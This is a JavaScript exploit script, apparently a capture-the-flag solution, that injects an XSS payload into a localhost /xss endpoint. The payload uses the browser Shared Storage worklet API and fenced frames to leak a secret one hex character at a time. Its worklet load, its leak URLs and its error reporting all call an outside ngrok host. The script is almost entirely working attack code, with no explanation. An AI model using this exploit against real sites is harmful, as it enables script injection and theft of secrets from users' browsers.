
charset = "0123456789abcdef";
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

var w;

console.log("loaded")

async function oracle(char){
  payload = `
<fancedframe id="fframe"></fancedframe>
  <script>

  const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

  (async () => {
  try {
    await window.sharedStorage.worklet.addModule('https://bcfb-151-45-75-194.ngrok-free.app/worklet.js?c={{sec}}${char}');
    
    const urls = [
      { url: "https://bcfb-151-45-75-194.ngrok-free.app/leak?secret=0" },
      { url: "https://bcfb-151-45-75-194.ngrok-free.app/leak?secret=1" }
    ];
    console.log("step 2");

    const fencedFrameConfig = await sharedStorage.selectURL('leak-secret', urls, { resolveToConfig: true });
    console.log("step 3");
    
    document.getElementById("fframe").config = fencedFrameConfig;
    console.log("step 4");

  } catch (err) {
    fetch("https://bcfb-151-45-75-194.ngrok-free.app/error?msg=" + encodeURIComponent(err.message));
  }
})();
<\/script>
  `;

  w = window.open("http://localhost:3000/xss?xss=" + encodeURIComponent(payload));

  await sleep(500);
}

var curr = -1;

window.addEventListener('message', (event) => {
  if (event.data === `start`){
    main()
  }else{event.source.postMessage(`pong: ${curr}`, event.origin);}
});


async function main(){
  await sleep(1000);
  for(let i = 0; i < 16; i++){
    curr = i;
    await oracle(charset[i]);
    await sleep(100);
  }

}

